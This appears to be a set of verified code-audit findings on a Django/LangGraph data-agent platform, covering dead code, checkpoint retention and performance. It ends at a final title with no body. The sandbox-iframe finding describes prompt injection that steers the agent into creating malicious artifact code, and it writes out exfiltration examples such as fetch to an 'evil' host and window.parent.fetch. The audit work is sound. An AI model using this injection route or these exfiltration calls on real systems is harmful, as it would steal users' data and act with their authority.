title: Large dead-code / rename-residue cluster (permissions, dual checkpointer, project_id audit, domainSlice, export 501, dead share surface, legacy data_dictionary, RecipeStep, execute_async, etc.)
claim: Multiple abandoned ~80% passes remain live-looking: dead DRF permission classes (covered separately); apps/agents/memory/checkpointer.py get_postgres_checkpointer/get_sync_checkpointer are dead with a silent MemorySaver-in-production fallback footgun while the live checkpointer is apps/chat (only get_database_url is imported); stream.py audit-logs input_state['project_id'] which no longer exists (always empty) and is emitted at INFO that production root-WARNING suppresses entirely; frontend still uses domainSlice/activeDomainId/setActiveDomainByTenantId no-op and a TenantMembership legacy alias with phantom fields; ArtifactExportView returns 501 for PNG/PDF while export.py has unused playwright implementations (playwright not in pyproject); RecipeStep model+admin+~150 test lines and RecipeRunner.execute_async have zero production readers; Workspace.data_dictionary has no writers so TableDetailView's legacy fallback and learning_tool's table validation are permanent no-ops; Artifact.create_new_version, run_commcare_sync shim, execute_internal_query, frontend dropdown-menu/barrels/STARTER_QUESTIONS are dead; CLAUDE.md/TODO.md misstate features (golden queries/eval runs absent; SET ROLE isolation listed unimplemented though query.py does it).

votes.evidence:
I independently re-traced every load-bearing sub-claim. Most are CONFIRMED; two are misstated, making the aggregate PARTIAL.

CONFIRMED sub-claims:
1. Dead dual checkpointer + silent MemorySaver footgun. apps/agents/memory/checkpointer.py defines get_postgres_checkpointer (lines 89-145, silent `yield MemorySaver()` on any Exception) and get_sync_checkpointer (148-159). grep across apps/tests/config shows ONLY `get_database_url` is imported from this module (by apps/chat/checkpointer.py:10). The two checkpointer factories have ZERO callers — only re-exported via apps/agents/memory/__init__.py. The LIVE checkpointer is apps/chat/checkpointer.py, which correctly RAISES in production when Postgres fails (lines 49-55, DEBUG-gated MemorySaver only). So the dead module's silent prod fallback is a real footgun-if-resurrected. CONFIRMED.

2. project_id audit residue, always empty. apps/chat/stream.py:182-188 logs `project_id=%s` via input_state.get("project_id", ""). The caller builds input_state in apps/chat/views.py:209-215 = {messages, workspace_id, user_id, user_role, thread_id} — NO project_id key. So it always emits "". (user_id IS present, consistent with the finding scoping only project_id as empty.) CONFIRMED.

3. INFO suppressed in production. audit_logger = logging.getLogger("scout.agent.audit") (stream.py:76), logs at .info(). config/settings/production.py LOGGING has no "scout.*" logger; the "apps" logger (INFO) does NOT cover "scout.agent.audit" namespace, so it propagates to root, level WARNING (production.py:52-55). INFO < WARNING => suppressed entirely. CONFIRMED.

4. Export 501 with unused playwright impls; playwright not in pyproject. apps/artifacts/views.py:980-986 returns 501 for png/pdf. apps/artifacts/services/export.py:373-454 has export_png/export_pdf with `from playwright.async_api import async_playwright`. grep playwright in pyproject.toml/uv.lock = ZERO matches. grep export_png/export_pdf callers = ZERO (only defs). CONFIRMED.

5. data_dictionary no writers => permanent no-op fallbacks. grep for assignment writers of `.data_dictionary =`/`data_dictionary=` (excluding model field def, migration, generated_at, filters) = ZERO writers. Only readers: apps/workspaces/api/views.py:425-427 (legacy fallback in TableDetailView) and apps/agents/tools/learning_tool.py:168 (`dd = workspace.data_dictionary or {}`, then `if known_tables:` guard at 172). Field is always null => both branches are permanent no-ops. CONFIRMED.

6. RecipeStep zero production readers. grep RecipeStep non-test/non-migration: only models.py:218 (def), admin.py (inline+admin). grep RecipeStep in apps/recipes/services/ = ZERO. No production execution path reads it. CONFIRMED.

7. RecipeRunner.execute_async no callers. apps/recipes/services/runner.py:257 def execute_async. grep execute_async in apps/recipes/ + frontend = only the def itself. CONFIRMED dead. (Note: the unrelated mcp_server _execute_async / _execute_async_parameterized are very much ALIVE — different symbol; finding correctly scoped to runner.py:257.)

8. run_commcare_sync shim, zero callers. mcp_server/services/materializer.py:1967 def run_commcare_sync. grep callers (non-def) = ZERO. CONFIRMED dead.

9. Artifact.create_new_version no readers. apps/artifacts/models.py:173 def. grep across apps/tests/frontend = only the def. CONFIRMED.

10. SET ROLE implemented but TODO lists it unimplemented. mcp_server/services/query.py:44 `SET ROLE {}` + 65 `RESET ROLE` — implemented. TODO.md:39 unchecked: "PostgreSQL role isolation ... use SET ROLE at query time". CONFIRMED misstatement.

11. CLAUDE.md golden queries/eval runs absent. CLAUDE.md:52 lists knowledge app as "golden queries, eval runs". apps/knowledge/models.py classes = TableKnowledge, KnowledgeEntry, AgentLearning. No GoldenQuery/EvalRun model. CONFIRMED.

12. setActiveDomainByTenantId no-op. frontend/src/store/domainSlice.ts:73-75 = eslint-disabled empty body. grep usage = only its own def lines (22-23, 73). Dead AND no-op. CONFIRMED.

13. TenantMembership legacy alias with phantom fields. domainSlice.ts:5-11 — alias of WorkspaceListItem with optional provider/tenant_id/tenant_name "legacy compat" fields, still imported by WorkspaceSwitcher.tsx. CONFIRMED.

MISSTATEMENTS (reasons for PARTIAL):
A. activeDomainId is NOT dead. The finding phrasing "frontend still uses domainSlice/activeDomainId/setActiveDomainByTenantId no-op" bundles activeDomainId with the no-op, but activeDomainId is LIVE and load-bearing: Sidebar.tsx (fetchThreads), ArtifactPanel.tsx (live API calls to /api/workspaces/${activeDomainId}/...), EmbedLayout, ChatEmptyState, ChatRedirect. Only setActiveDomainByTenantId is the no-op. Lumping activeDomainId into the dead-code list is wrong.

B. execute_internal_query mechanism is subtle, not flatly "dead". mcp_server/services/query.py:96 execute_internal_query has no non-test callers — production metadata helpers (metadata.py:145,167,199) call _execute_async_parameterized DIRECTLY, bypassing this wrapper. tests/test_mcp_tenant_tools.py:29-31 even comments "the helpers do `from ... import execute_internal_query`" and patches that target — but that import path is NOT what current metadata.py uses. So the symbol IS effectively dead in production, but the finding's implication that it's cleanly unreferenced is imprecise: a whole test suite still exercises it against a patch target prod no longer routes through. Real defect, misstated mechanism.
votes.notes: Aggregate verdict PARTIAL: ~13 of ~15 checkable sub-claims independently CONFIRMED as genuine dead-code/rename-residue/doc-drift; status DEBT and impact velocity are correct (none of these break a live path today — the silent-MemorySaver footgun is latent-only since the live apps/chat checkpointer is the wired one). Two corrections: (A) activeDomainId is very much alive and should be struck from the dead list — only setActiveDomainByTenantId is the no-op; (B) execute_internal_query is effectively dead but the finding understates that an entire test suite still patches it at an import path production metadata helpers bypass (they call _execute_async_parameterized directly) — fixing the dead wrapper requires touching those tests. permissions.py was explicitly scoped out ("covered separately") so I did not adjudicate it. Recommend the synthesis split this mega-cluster: the project_id INFO-suppressed audit-log residue and the silent-MemorySaver checkpointer are the two highest-value cleanups; the doc-drift (SET ROLE TODO, golden/eval in CLAUDE.md) is cheap and worth doing to avoid misleading future contributors.

title: Artifact sandbox iframe: allow-scripts + allow-same-origin neutralizes the sandbox; agent-generated code runs same-origin with full user API authority
claim: The sandbox page is served same-origin and session-authenticated, executes agent-generated React via Babel.transform + new Function (and re-executes arbitrary <script> tags including remote src for html artifacts), and is embedded with sandbox='allow-scripts allow-same-origin allow-modals' — that combination on a same-origin document makes the sandbox a no-op. CSP allows 'unsafe-eval' and connect-src 'self', and CSRF_COOKIE_HTTPONLY=False makes the CSRF token JS-readable, so artifact code can issue credentialed state-changing /api/ requests as the viewing user and reach window.parent. Artifacts are agent-generated code steerable by prompt injection from materialized third-party data (e.g. OCS message content) or by any read_write member: stored XSS / exfiltration across workspace members with full API reach. ArtifactPanel's postMessage listener also lacks an origin check. Server-side PNG/PDF export (if wired) loads agent HTML into headless Chromium with no CSP/egress restriction (SSRF). The docs' 'sandboxed rendering' claim does not match the implementation.

votes.evidence:
I re-traced every link from my own reads, not the finding's quotes.

SAME-ORIGIN + SANDBOX NO-OP: ArtifactPanel renders the iframe with src=`/api/workspaces/${activeDomainId}/artifacts/${artifactId}/sandbox/` and `sandbox="allow-scripts allow-same-origin allow-modals"` (frontend/src/components/ArtifactPanel/ArtifactPanel.tsx:189-196). The src is a RELATIVE URL, so it resolves against the SPA's own origin; `/api` is proxied same-origin (frontend/vite.config.ts:48-50 in dev, and a same-origin proxy is required in prod for the SPA's credentialed `/api` calls to work at all). Because the document is same-origin AND the sandbox carries `allow-same-origin`+`allow-scripts`, the iframe keeps its real origin instead of an opaque one — isolation is neutralized exactly as claimed. The sandbox view is served by Django (apps/artifacts/views.py:673-717), gated only by LoginRequiredJsonMixin + workspace membership.

RCE-IN-BROWSER: renderReact does `Babel.transform(stripped, {presets:['react']}).code` then `new Function('React','ReactDOM',...,`...${transformed}...`)` (views.py:375-458), executing agent-authored `artifact.code`. This needs `unsafe-eval`, which the page CSP grants: `script-src 'nonce-..' 'unsafe-eval' https://cdn.jsdelivr.net ...` (views.py:46, generate_csp_with_nonce). renderHTML also re-creates and re-executes <script> tags incl. remote `src` (views.py:510-522).

CREDENTIALED API REACH: connect-src is `'self' https://cdn.jsdelivr.net` (views.py:50) → same-origin fetch to `/api/...` is allowed; the sandbox already issues `fetch(...'/query-data/', {credentials:'include'})` (views.py:254-256). CSRF_COOKIE_HTTPONLY=False (config/settings/base.py:336) makes the CSRF token JS-readable, so artifact code can forge state-changing POST/PATCH/DELETE to `/api/` as the viewing user (the httponly session cookie rides along automatically). Same-origin status also gives `window.parent` access (the code already calls `window.parent.postMessage` at views.py:265).

REACHABILITY: artifact `code`/`artifact_type` come straight from the agent's create_artifact tool (apps/agents/tools/artifact_tool.py:29-30,56 — `create_artifact_tools`, fields `code: str`, `artifact_type: str`), so the payload is steerable by prompt content / any read_write member; the iframe is a live UI element (ArtifactPanel) reached in the chat flow. Route is wired: config/urls.py:62,91-94 → apps/artifacts/urls.py:30-33.

POSTMESSAGE ORIGIN: ArtifactPanel's listener checks only `event.data?.type`/`artifactId`, no `event.origin` check (ArtifactPanel.tsx:72-80) — confirmed. (Note the sandbox's OWN listener at views.py:662-663 does check origin.)

PNG/PDF SSRF — correctly hedged as conditional: export_png/export_pdf exist (services/export.py:373-453, `page.set_content(html)` in headless chromium, no CSP/egress limit) but have ZERO callers (grep for export_png/export_pdf returned no call sites), and the only export route returns HTTP 501 for png/pdf (views.py:980-986). So that sub-path is genuinely not wired today, matching the finding's "(if wired)".

Docs mismatch confirmed: CLAUDE.md describes artifacts as "sandboxed React rendering," which the allow-same-origin combination contradicts.
votes.notes:
Core chain fully reproduced; CONFIRMED. Three nuances refine (not refute) it:

1) DIRECT exfiltration from the iframe to an attacker host is CSP-constrained: connect-src is `'self' https://cdn.jsdelivr.net` and img-src is only `data: blob:`, and the sandbox lacks allow-top-navigation/allow-popups — so a naive `fetch('https://evil/?'+data)` from the artifact is blocked. The real escape is the window.parent hop: because the frame is same-origin with allow-same-origin, artifact code runs `window.parent.fetch(...)` in the SPA's context, inheriting the parent document's (likely looser/absent) CSP. I found no CSP applied to the SPA itself, so external exfil is achievable via the parent — the finding's "exfiltration" outcome holds, just via parent context rather than directly.

2) renderHTML remote `<script src>` re-execution is bounded by the nonce-based CSP: dynamically inserted inline scripts lack the nonce and non-allowlisted remote src are blocked; only jsdelivr/cdnjs/unpkg src load. The React/new Function path (which only needs unsafe-eval, present) is the unconstrained vector, so this doesn't reduce overall severity.

3) Status: I set corrected_status=BROKEN-NOW rather than LATENT. The isolation control is presently inert for EVERY artifact (not gated behind a flag/config), and a normal low-privilege actor in the threat model (any read_write member, or a prompt-injected agent fed third-party materialized data like OCS message content) can exploit it today with no special conditions. LATENT is defensible if you weight "requires a planted malicious payload," but the security boundary itself is non-functional in normal operation now. impact=security unchanged. Replication=5 is appropriate.

title: Multiple divergent table-catalog implementations: system prompt advertises terminal/transformation assets that list_tables omits; get_metadata returns 0 tables for multi-tenant; get_schema_status reads a dead result shape
claim: Table truth is computed 4-6 ways that disagree, the contradictory-schema-response class behind the #190 panic loops. (1) transformation_aware_list_tables (prompt only) lists terminal stg_* TransformationAssets unconditionally with no physical-existence check, while the MCP list_tables tool uses plain pipeline_list_tables (raw names only; pipeline_config.dbt_models empty in all shipped YAMLs) — prompt advertises tables the agent's own tool omits/that failed dbt left absent. (2) get_metadata looks up TenantSchema by ctx.schema_name, which for multi-tenant is the ws_* view schema and never matches, returning success with table_count=0/tables={} while list_tables' view-schema branch works. (3) get_schema_status reads last_run.result['tables']/['table']+'rows_loaded' but the materializer writes only {sources,pipeline,transforms}, so it always returns tables=[] with state=active. (4) workspace_list_tables returns every view including stg_* and in-progress raw tables with no completion filtering, unlike the single-tenant catalog. No shared catalog service.

votes.evidence:
Re-traced all four sub-claims independently:

(1) Prompt vs list_tables divergence — CONFIRMED. The single-tenant system prompt builder `_fetch_schema_context` (apps/agents/graph/base.py:246-251) calls `transformation_aware_list_tables` whenever terminal assets exist; that function appends every terminal TransformationAsset with no physical-existence check (mcp_server/services/metadata.py:312-323 — it builds `result.append({"name": asset.name, ...})` straight from DB rows, while raw tables are reconciled against `_live_tables_in_schema`). Assets are created during the DISCOVER phase, before dbt runs (mcp_server/services/materializer.py:217-223 `upsert_system_assets`), and a dbt failure is swallowed — `except Exception ... transform_result = {"error": str(e)}` (materializer.py:455-457) — with the run still marked COMPLETED (materializer.py:465-477). So the prompt advertises stg_* tables that a failed dbt build never created. Meanwhile the MCP `list_tables` tool's single-tenant path calls plain `pipeline_list_tables` (mcp_server/server.py:161); `transformation_aware_list_tables` is not even imported by server.py (imports at server.py:58-63). And `pipeline_config.dbt_models` is empty in all three shipped pipelines — `grep transforms|models pipelines/*.yml` returns nothing (commcare_sync.yml, connect_sync.yml, ocs_sync.yml), so metadata.py:96 never adds dbt models. Net: prompt lists stg_* and hides replaced raw tables; the agent's own tool lists raw tables and never stg_*.

(2) get_metadata multi-tenant zero-tables — CONFIRMED. `load_workspace_context` returns a `ws_*` view-schema context for 2+ tenants (mcp_server/context.py:113-139, schema_name=vs.schema_name). `get_metadata` does `TenantSchema.objects.filter(schema_name=ctx.schema_name)` (server.py:248) which can never match a ws_* name, then returns success_response with `"table_count": 0, "tables": {}` (server.py:249-255). `list_tables` has the WorkspaceViewSchema branch (server.py:126-137); `get_metadata` has none. Reachable today: agent loads all MCP tools unfiltered (apps/agents/mcp_client.py:54 `client.get_tools()`).

(3) get_schema_status dead result shape — CONFIRMED. Single-tenant branch reads `result_data["tables"]` else `result_data["table"]+"rows_loaded"` (server.py:718-724). The only writer of MaterializationRun.result writes `{"sources": ..., "pipeline": ..., "transforms": ...}` (materializer.py:465-477; checkpoints at 366-368, 395-398, 422-424, 621-623 write only sources/pipeline). Repo-wide grep: "rows_loaded" appears only in run.progress and the tool return payload, never run.result; no writer emits a "tables" or "table" key. So the tool always returns `tables: []` with `state: "active"` for a loaded single-tenant workspace — contradicting list_tables on the same data.

(4) workspace_list_tables no filtering — CONFIRMED. `workspace_list_tables` returns every view in the ws_* schema (metadata.py:161-185, plain information_schema query). `build_view_schema` creates a view per table found via `SELECT table_name FROM information_schema.tables WHERE table_schema = %s AND table_type IN ('BASE TABLE','VIEW')` (apps/workspaces/services/schema_manager.py:328-344) with zero reconciliation against MaterializationRun source states — unlike `pipeline_list_tables` which excludes `state != "completed"` sources (metadata.py:80-84). So stg_* tables and partially-loaded raw tables left by failed/in-progress runs get views and are listed. Bonus divergence: the data-dictionary API explicitly filters `t["name"].startswith("stg_")` out of pipeline_list_tables output (apps/workspaces/api/views.py:273-277) — a fifth, again different, catalog policy.

Reachability: all confirmed paths are live — MCP tools exposed unfiltered to the agent, prompt contexts wired at base.py:758 (single-tenant) and :769 (multi-tenant), multi-tenant workspaces a shipped feature (load_workspace_context routing).
votes.notes: Three minor precision caveats, none verdict-changing: (a) stg_* system assets are only generated for provider == "commcare" (materializer.py:217), so sub-claim 1's prompt/tool contradiction affects CommCare tenants — the primary provider — not Connect/OCS; (b) sub-claim 4's "in-progress raw tables" in views requires a partial physical table to exist at view-build time (residue of a failed/partial run, or a rebuild concurrent with another tenant's load) — the structural gap (no completion filter anywhere in the view path) is unconditional, the specific exposure is timing/state dependent; (c) the causal link to "#190 panic loops" was not independently verified (issue tracker not consulted) — treat that as framing. Count check: I found at least 5 distinct catalog implementations (pipeline_list_tables, transformation_aware_list_tables, workspace_list_tables, get_schema_status's dead result-shape reader, and the data-dictionary API's stg_-filtered variant), consistent with the finding's "4-6 ways".

title: System-prompt assembly opens serial per-table fresh TLS DB connections every 60s cache miss; no Anthropic prompt caching; per-process caches under 4 workers
claim: _build_system_prompt caches per (workspace,user,prompt-hash) with a 60s TTL in a per-process dict; on miss _fetch_schema_context runs ~4 ORM queries plus one pipeline_describe_table per table SERIALLY, each opening a fresh psycopg TLS connection to the managed DB (no pool in mcp_server), plus an atouch() write — up to 4 x U x (T+4) serial round trips/min/workspace on the latency path before the first token. ChatAnthropic is built with only model+max_tokens and no cache_control breakpoint anywhere, so the large static system prompt + ~15 tool schemas are re-billed at full input rate on every LLM call (K+1 calls per K-tool turn), even though the prefix is engineered stable for 60s and is cacheable. Embedding row counts/timestamps in the prompt also changes prompt text across materializations, defeating Anthropic prompt-cache hits. uvicorn --workers 4 means 4 independent caches/circuit-breakers and up to 4x20 checkpointer pool connections.

votes.evidence:
I independently re-traced the full chain from the live route to the consequence.

REACHABILITY: `/api/chat/` is a live route (config/urls.py:98 `path("api/chat/", chat_view, name="chat")`). `chat_view` (apps/chat/views.py:26, decorated @csrf_protect/@async_login_required/@chat_rate_limit) calls `build_agent_graph(...)` on every POST at views.py:167 (and retry at :179). `build_agent_graph` calls `await _build_system_prompt(workspace, user)` at base.py:525, BEFORE the LLM call — agent_node builds `messages = [SystemMessage(content=system_prompt), *repaired]` (base.py:580) then `await llm_with_tools.ainvoke(messages)` (base.py:581). So system-prompt assembly is on the pre-first-token latency path. Confirmed.

60s PER-PROCESS DICT CACHE: `_system_prompt_cache: dict[str, tuple[str, float]] = {}` (base.py:127), `_SYSTEM_PROMPT_TTL = 60` (base.py:128). Key = `f"{workspace.id}:{user_id}:{prompt_hash}"` (base.py:142, includes user.id and md5 of workspace.system_prompt). _build_system_prompt checks `time.monotonic() - timestamp < _SYSTEM_PROMPT_TTL` (base.py:721) and stores at base.py:774. Module-global → per-process. Confirmed.

SERIAL PER-TABLE FRESH TLS CONNECTIONS ON MISS: `_fetch_schema_context` (base.py:205) runs: TenantSchema.filter().afirst() (base.py:211); aget_terminal_assets (base.py:246); transformation_aware_list_tables OR pipeline_list_tables (base.py:249/251); TenantMetadata.filter().afirst() (base.py:263); then `for t in tables: await pipeline_describe_table(...)` SERIALLY (base.py:268-269). `pipeline_describe_table` (metadata.py:188) calls `_execute_async_parameterized` (metadata.py:199) which at query.py:73 does `await psycopg.AsyncConnection.connect(**ctx.connection_params, autocommit=True)` — a FRESH connection, no pool (no AsyncConnectionPool anywhere in mcp_server). connection_params carry `sslmode=require` (context.py:161 default). Plus `load_tenant_context` (base.py:260) does `await ts.atouch()` write (context.py:66). So ~4 ORM queries + T serial describe_table round-trips, each a fresh TLS connect. Confirmed exactly as claimed.

NO ANTHROPIC PROMPT CACHING: Exactly one ChatAnthropic instantiation, `ChatAnthropic(model=settings.DEFAULT_LLM_MODEL, max_tokens=DEFAULT_MAX_TOKENS)` (base.py:517-520) — only model+max_tokens. `grep -rn "cache_control|ephemeral|anthropic-beta|prompt_cache"` over apps/ mcp_server/ config/ found NO Anthropic prompt-caching usage (the only `cache_control` hit is Django's HTTP decorator in config/views.py; `ephemeral` is dbt-related). `llm.bind_tools(llm_tool_schemas)` (base.py:522) adds no cache_control breakpoint. So the static system prompt + ~11 MCP tool schemas (mcp_server/server.py has 11 @mcp.tool) + local tools (~15 total) are re-billed at full input rate on every LLM call in the agent↔tools loop. Confirmed.

CACHE-BUSTING CONTENT: row counts (`materialized_row_count`, formatted at base.py:158/186) and `last_materialized_at` timestamp (base.py:149/179) are embedded in prompt text, so the prefix text changes across materializations — defeats Anthropic prefix-cache hits even if caching were enabled. Confirmed.

4 WORKERS / POOL: config/deploy.yml:17 cmd includes `--workers 4`. Checkpointer pool `AsyncConnectionPool(..., max_size=20, ...)` (apps/chat/checkpointer.py:31), module-global `_pool` → per-process. 4 workers × 20 = up to 80 checkpointer connections, plus 4 independent prompt caches/circuit-breakers. Confirmed.
votes.notes:
CONFIRMED with high confidence; every file:line in the finding matches reality. Two small precisions that do not change the verdict or severity:

(1) The TTL cache substantially blunts the cost the finding's headline number implies: only the FIRST request per (workspace,user,prompt-hash) key in each 60s window pays the full ~4+T serial fresh-connection schema fetch; subsequent hits within 60s return the cached string with zero DB work. The finding's own per-minute framing ("up to 4 x U x (T+4) ... /min/workspace") already accounts for this (4 = workers, U = distinct users, one miss per worker per user per minute), so it is fair, not inflated.

(2) Of the "~4 ORM queries", the TenantSchema/TenantMetadata/MaterializationRun/terminal-asset queries run against the PLATFORM Django DB (pooled by Django), while only the per-table describe_table calls and atouch's downstream effects hit the MANAGED DB via unpooled fresh psycopg connects. The "fresh TLS connection per table with no pool" claim is precisely correct for the managed-DB describe_table loop, which is the dominant cost; the platform-DB ORM queries are not unpooled fresh-TLS. This is a minor mechanism nuance, not an error — the expensive part (serial unpooled TLS round-trips to the managed DB, one per table) is exactly as described.

(3) Multi-tenant path (_fetch_multi_tenant_schema_context, base.py:306) does NOT do a per-table describe loop — it issues a single information_schema query (workspace_list_tables) — so the T-fanout cost is single-tenant-specific. The finding focuses on the single-tenant describe loop, which is correct.

Status DEBT and impact cost-perf are accurate: the code is functionally correct and works today; this is pure latency/$ inefficiency on a hot path, not a correctness/data-loss/security defect.

title: Member removal deletes Thread rows but never deletes LangGraph checkpoints; checkpoints never pruned anywhere
claim: WorkspaceMemberDetailView.delete (and workspace deletion cascade) removes the member's Thread rows, but nothing ever deletes the corresponding LangGraph checkpoints — full conversation contents including query results persist indefinitely in the checkpoint tables after membership removal (data-retention/privacy gap), checkpoints accrete unboundedly per superstep (a K-tool turn writes ~2K+1 full-history copies, ~99% write-only), and a re-added member POSTing the old thread UUID gets a fresh Thread row whose checkpointer silently resumes the old conversation. No thread-delete endpoint and no checkpoint-deletion call site exists anywhere; ownership cleanup is also inconsistent (threads destroyed while the member's artifacts/recipes/knowledge survive). Unbounded platform-DB growth on the same RDS as state tables and the queue.

votes.evidence:
I independently re-traced the full chain.

1. Member removal does NOT delete checkpoints. apps/workspaces/api/workspace_views.py:516-519 (WorkspaceMemberDetailView.delete): `Thread.objects.filter(workspace=workspace, user=target.user).delete()` then `target.delete()`. No checkpoint call.

2. Workspace deletion cascade. workspace_views.py:355 `workspace.delete()` relies on FK CASCADE. apps/chat/models.py:12-15 Thread.workspace is `on_delete=models.CASCADE`, so Thread rows go, but LangGraph checkpoint tables are not FK-linked (keyed by thread_id text), so they survive.

3. The checkpointer HAS a delete method that is never called. `uv run python -c "...dir(AsyncPostgresSaver)..."` returns `['adelete_thread','delete_thread']`. A grep across apps/ config/ mcp_server/ for `adelete_thread|delete_thread|checkpoint.*delete|delete.*checkpoint` returns EMPTY. No call site exists anywhere.

4. No thread-delete endpoint. apps/chat/urls.py:20-25 wires only list/messages/share/viewed — no DELETE path.

5. No pruning task/cron. The only checkpoint references in apps/workspaces/tasks.py are `_persist_synthetic_failure_message` (appends an AIMessage) and cancellation-checkpoint comments — not pruning.

6. Haunted resume on re-add. apps/chat/views.py:48-52 `_upsert_thread` uses `Thread.objects.aupdate_or_create(id=thread_id, ...)`, so re-POSTing the old UUID recreates a Thread row with that exact id. apps/chat/thread_views.py:97-99 keys the checkpointer purely on `{"configurable": {"thread_id": str(thread_id)}}`, so the surviving checkpoint silently rehydrates the old conversation.

7. Ownership inconsistency confirmed: apps/artifacts/models.py:68-70 created_by `on_delete=SET_NULL`; apps/recipes/models.py:85-90 `SET_NULL`; apps/knowledge/models.py:73,108,178-179 all `SET_NULL`. These survive user removal (just nulled) while Thread rows are hard-deleted.

Reachability: live DELETE route at config/urls.py:70-72 -> WorkspaceMemberDetailView; frontend frontend/src/api/workspaces.ts:149-150 `removeMember` -> DELETE; called from frontend/src/pages/WorkspaceDetailPage/WorkspaceDetailPage.tsx:82. User-facing and live today.

No pre_delete/post_delete signal handlers exist in apps/chat (directory listing + grep both empty), so nothing intercepts the cascade to prune checkpoints.
votes.notes:
Verdict CONFIRMED on the core defect: checkpoints are never deleted on member removal or workspace deletion, no delete endpoint/call site/pruning task exists, the langgraph adelete_thread method is available but unused, and the aupdate_or_create-by-id + thread_id-keyed checkpointer produces the haunted-resume on re-add. Ownership inconsistency (threads hard-deleted while artifacts/recipes/knowledge SET_NULL-survive) is verified.

Two PARTIAL-style nuances that do NOT change the verdict:
- The quantitative write-amplification ("~2K+1 full-history copies per K-tool turn, ~99% write-only") is a reasonable order-of-magnitude description of LangGraph's checkpoint-per-superstep model, but I did not measure actual row counts. The qualitative claim (unbounded, never-pruned accretion on the same RDS as state + queue) is solid.
- The finding's impact field is `correctness`, but the dominant harm is data-retention/privacy persistence of full conversation contents (incl. query results) after access revocation, plus unbounded cost/perf growth. I'd classify the primary impact as data-loss/retention (sensitive data persists after the access-control boundary should have removed it) with a secondary cost-perf dimension. I set corrected_impact to data-loss to capture the privacy/retention angle; the haunted-resume also has a genuine correctness/security facet. Status LATENT is correct: no error today, but the gap is real and grows over time.

title: FutureApp import-time current_app binding (cause of the fixed janitor bug) survives at three sibling sites with swallowed exceptions
claim: tasks.py documents and fixed (28b6647, ORM-based) the bug where module-level `from procrastinate.contrib.django.procrastinate_app import current_app` binds the unresolved FutureApp Blueprint (no job_manager). The identical import-by-value pattern survives at mcp_server/server.py:32, apps/workspaces/api/materialization_views.py:9, and apps/workspaces/api/jobs_cancel.py:11, all used for best-effort cancel/abort wrapped in try/suppress — they work only because views/MCP import after AppConfig.ready(); an import-order regression would silently disable all procrastinate aborts with no signal. The safe lazy ProxyApp spelling is already used by config/procrastinate.py.

votes.evidence:
Independently re-traced the full chain.

MECHANISM (confirmed in the installed library): `.venv/.../procrastinate/contrib/django/procrastinate_app.py:73` binds `current_app: ... = cast(..., FutureApp())` at import time. `FutureApp(blueprints.Blueprint)` (line 29) does NOT list `job_manager` in `_shadowed_methods` (lines 30-51), and `job_manager` is set only in `App.__init__` (`procrastinate/app.py:114`), never in `Blueprint.__init__` (`blueprints.py:73` sets only `self.tasks`). Empirically verified: `FutureApp().job_manager` raises `AttributeError: 'FutureApp' object has no attribute 'job_manager'`. The rebind happens in `apps.py:18-20` `ready()`: `procrastinate_app.current_app = create_app(blueprint=procrastinate_app.current_app)` — this rebinds the module global, so a value-import taken before that point keeps the stale FutureApp. The safe lazy spelling is `ProxyApp` (`procrastinate_app.py:56-66`, exported as `app`), whose `__getattr__` does `getattr(current_app, name)` on every access; `config/procrastinate.py:12` uses `from procrastinate.contrib.django import app` (the ProxyApp), confirming the finding's "safe spelling already used" claim.

ORIGINAL BUG (confirmed): `git show 28b6647` = "fix(workspaces): janitor job-status lookup via ORM instead of unresolved FutureApp"; the commit body states verbatim the mechanism above. Root cause of why the worker captured the stale binding: `AUTODISCOVER_MODULE_NAME="tasks"` (procrastinate `settings.py:22`); `get_import_paths()` runs autodiscovery INSIDE `create_app()` (apps.py:32, 43), which runs INSIDE the `ready()` rebind RHS — so `apps/workspaces/tasks.py`'s module-level `from ...procrastinate_app import current_app` executes before the rebind completes and captures FutureApp. `tasks.py:13-725` now uses `ProcrastinateJob.objects.filter(...)` (ORM, `tasks.py:15` import + line 715) instead.

THREE SIBLING SITES (confirmed at exact lines): `mcp_server/server.py:32` `import current_app as _procrastinate_app`, used at line 633 inside `contextlib.suppress(Exception)` (line 632) in the run_materialization rollback. `apps/workspaces/api/materialization_views.py:9` import, used at line 108 (try/except Exception + logger.warning, 112-117) and line 209 (`contextlib.suppress`, 208). `apps/workspaces/api/jobs_cancel.py:11` import, used at line 44 (try/except Exception + logger.warning, 47-52). `grep` over apps/, mcp_server/, config/ shows exactly these three value-imports and no others.

REACHABILITY (confirmed live): `apps/workspaces/api/urls.py:25-38` wires `materialization/cancel/` → materialization_cancel_view, `materialize/retry/` → materialization_retry_view, `jobs/<uuid:thread_job_id>/cancel/` → cancel_job_view (which calls cancel_thread_job in jobs_cancel.py). `config/urls.py:66` includes `apps.workspaces.api.urls`. MCP run_materialization is a live `@mcp.tool()`. All three modules import only after Django setup (via URL config / MCP boot), so they currently capture the resolved App — verified empirically: after `django.setup()`, `from ...procrastinate_app import current_app` yields an `App` with a working `job_manager`. No `tasks.py` imports these modules (grep confirmed), so no pre-ready import path exists today → LATENT, not BROKEN-NOW.

NO GUARD (confirmed): tests mock the reference directly — `tests/test_jobs_endpoints.py:393,484` `patch("apps.workspaces.api.jobs_cancel.current_app")`, `tests/test_run_materialization_fire_and_ack.py:69` `patch("mcp_server.server._procrastinate_app")` — so an import-order regression that re-staled these would not be caught.
votes.notes: Verdict PARTIAL rather than CONFIRMED only because of one overstatement in the finding's wording: "silently disable all procrastinate aborts with no signal." In reality two of the four call sites (jobs_cancel.py:48 and materialization_views.py:113) emit `logger.warning("Failed to abort procrastinate job %s", ..., exc_info=True)`, so there WOULD be a log signal (with full traceback) at those two — the AttributeError is caught and logged, not invisible. The other two (mcp_server/server.py:632-633 and materialization_views.py:208-209) use `contextlib.suppress(Exception)` and are fully silent. In all four cases the abort itself silently no-ops (the abort never reaches procrastinate), which is the substantive harm and matches the finding. So the defect, mechanism, status (LATENT), impact (correctness), files, and line numbers are all correct; only "with no signal" is imprecise (2 of 4 sites log a non-obvious warning whose traceback would actually point at the stale FutureApp). Everything else in the finding — including the cause-link to the fixed 28b6647 janitor bug and the recommendation to use the ProxyApp spelling already in config/procrastinate.py — is accurate. Replication=2 (the pattern recurs at 3 sites) is reasonable. Recommend the fix: switch all three value-imports to `from config.procrastinate import app` (the lazy ProxyApp), which is always live regardless of import order.

title: Prompt instructs run_materialization with a pipeline= parameter the tool no longer accepts (single-tenant branch); recurring prompt-vs-contract drift
